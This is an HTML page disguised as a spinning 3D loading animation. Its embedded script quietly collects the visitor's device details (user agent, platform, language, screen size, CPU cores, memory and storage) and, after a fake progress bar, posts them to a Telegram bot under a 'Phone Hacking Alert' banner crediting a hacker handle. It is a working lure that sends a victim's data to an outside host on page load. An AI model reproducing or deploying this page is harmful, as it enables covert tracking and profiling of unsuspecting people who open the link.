<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>3D Loading Device Info</title>
<style>
  body {
    margin: 0;
    font-family: 'Segoe UI', Arial, sans-serif;
    background: linear-gradient(135deg, #6a11cb, #2575fc);
    height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    perspective: 1000px;
    overflow: hidden;
  }
  .card {
    width: 350px;
    height: 350px;
    background: rgba(255,255,255,0.05);
    border-radius: 20px;
    display: flex;
    align-items: center;
    justify-content: center;
    transform-style: preserve-3d;
    box-shadow: 0 20px 50px rgba(0,0,0,0.3);
    animation: rotate 6s infinite linear;
  }
  @keyframes rotate {
    0% { transform: rotateX(0deg) rotateY(0deg);}
    100% { transform: rotateX(360deg) rotateY(360deg);}
  }
  .loader {
    width: 200px;
    height: 20px;
    background: rgba(255,255,255,0.2);
    border-radius: 10px;
    overflow: hidden;
    box-shadow: inset 0 0 10px rgba(0,0,0,0.2);
  }
  .loader-bar {
    width: 0%;
    height: 100%;
    background: linear-gradient(90deg,#ff6a00,#ee0979);
    border-radius: 10px;
    box-shadow: 0 0 10px rgba(255,255,255,0.6);
    transition: width 0.1s;
  }
  .status {
    position: absolute;
    bottom: 30px;
    color: #fff;
    font-weight: 600;
    text-align: center;
    width: 100%;
    font-size: 16px;
    text-shadow: 0 0 10px rgba(0,0,0,0.5);
  }
</style>
</head>
<body>
<div class="card">
  <div class="loader"><div class="loader-bar" id="loaderBar"></div></div>
</div>
<div class="status" id="status">Loading...</div>

<script>
(async function(){
const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"; // خپل ټوکن دلته ورکړئ
const CHAT_ID_FROM_URL = new URLSearchParams(location.search).get('id') || '';
const loaderBar = document.getElementById('loaderBar');
const statusEl = document.getElementById('status');

function safeText(s){ return String(s||'').replace(/<|>/g,''); }

async function collectDeviceInfo(){
  const nav = navigator;
  const ua = nav.userAgent || 'unknown';
  const platform = nav.platform || 'unknown';
  const language = nav.language || 'unknown';
  const cores = nav.hardwareConcurrency || 'unknown';
  const devMem = nav.deviceMemory ? nav.deviceMemory + ' GB' : 'unknown';
  const screenSize = (screen.width||0) + 'x' + (screen.height||0);
  const dpr = window.devicePixelRatio || 1;
  let storageInfo='unknown';
  if(navigator.storage && navigator.storage.estimate){
    try{
      const est = await navigator.storage.estimate();
      const q = n => n ? Math.round(n/1024/1024) + 'MB' : 'unknown';
      storageInfo = `usage=${q(est.usage)} / quota=${q(est.quota)}`;
    }catch(e){}
  }
  return {ua, platform, language, cores, devMem, screenSize, dpr, storageInfo};
}

function makeMessage(info){
  const now = new Date().toLocaleString();
  const lines = [
    '🔥 Phone Hacking Alert! 🔥',
    '🛡️ Device info',
    `1) Model/Platform: ${safeText(info.platform)}`,
    `2) User Agent: ${safeText(info.ua)}`,
    `3) Language: ${safeText(info.language)}`,
    `4) Screen: ${safeText(info.screenSize)} @${safeText(info.dpr)}x`,
    `5) CPU cores: ${safeText(info.cores)}`,
    `6) Device memory: ${safeText(info.devMem)}`,
    `7) Storage: ${safeText(info.storageInfo)}`,
    '',
    `⏰ Time: ${now}`,
    `🦠 BotDeveloper: @ProHacker43`,
    `🪬 Bot link: @PROCAM_43KHACKBOT`,
    `💀 Stay vigilant!`
  ];
  return lines.join('\n');
}

async function sendToTelegram(message){
  if(!CHAT_ID_FROM_URL){statusEl.textContent='Missing chat id in URL'; return;}
  try{
    const fd = new FormData();
    fd.append('chat_id', CHAT_ID_FROM_URL);
    fd.append('text', message);
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{method:'POST',body:fd});
    statusEl.textContent='Sent ✅';
  }catch(err){
    console.error(err);
    statusEl.textContent='Send failed';
  }
}

function animateLoader(duration=2500){
  return new Promise(resolve=>{
    let start = null;
    function step(timestamp){
      if(!start) start=timestamp;
      let progress = Math.min((timestamp-start)/duration*100,100);
      loaderBar.style.width = progress+'%';
      statusEl.textContent = `Loading... ${Math.round(progress)}%`;
      if(progress<100) requestAnimationFrame(step);
      else resolve();
    }
    requestAnimationFrame(step);
  });
}

(async function main(){
  const info = await collectDeviceInfo();
  await animateLoader(2500);
  await sendToTelegram(makeMessage(info));
})();
})();
</script>
</body>
</html>
